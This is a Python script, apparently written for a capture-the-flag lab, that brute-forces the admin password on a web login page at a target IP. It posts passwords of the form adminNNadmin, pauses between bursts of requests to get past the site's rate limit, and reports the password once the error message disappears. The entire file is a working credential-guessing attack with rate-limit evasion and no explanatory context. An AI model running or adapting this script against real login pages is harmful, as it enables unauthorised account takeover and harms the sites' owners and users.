#!/usr/bin/env python3.10
from requests import post 
from time import sleep
from bs4 import BeautifulSoup
from sys import argv 
from colorama import Fore 

# script.py IP

# ip = "10.10.116.71"
ip = argv[1]


def wait():
    print(f'{Fore.BLUE}Waiting 60 seconds')
    sleep(61)
    print(f'{Fore.YELLOW}Starting again{Fore.RESET}')

sent_requests = 0

for num in range(0,99):
         
    current_password = f'admin{str(num).zfill(2)}admin'
    post_data = {
        'username': 'admin',
        'password': current_password,
        'submit': 'Submit'
    }
    
    response = post(f'http://{ip}/index.php', data=post_data) 
    sent_requests += 1 
    soup = BeautifulSoup(response.content, 'html.parser')
    result = soup.find('div', {'id': 'result'}).text
    # print(result)
    
    if sent_requests > 2:
        sent_requests = 0 # Reset
        wait()
    # print('Please login after 60 sec' in result)
    # print('Please enter valid login details.' in result)
    if result == '':
        print(f'{Fore.GREEN}The Admin password is {Fore.RED}{current_password}{Fore.RESET}')
        exit(0)
    
    #else:
        #print(f'{Fore.CYAN}{current_password} is wrong{Fore.RESET}')
        #wait()
        
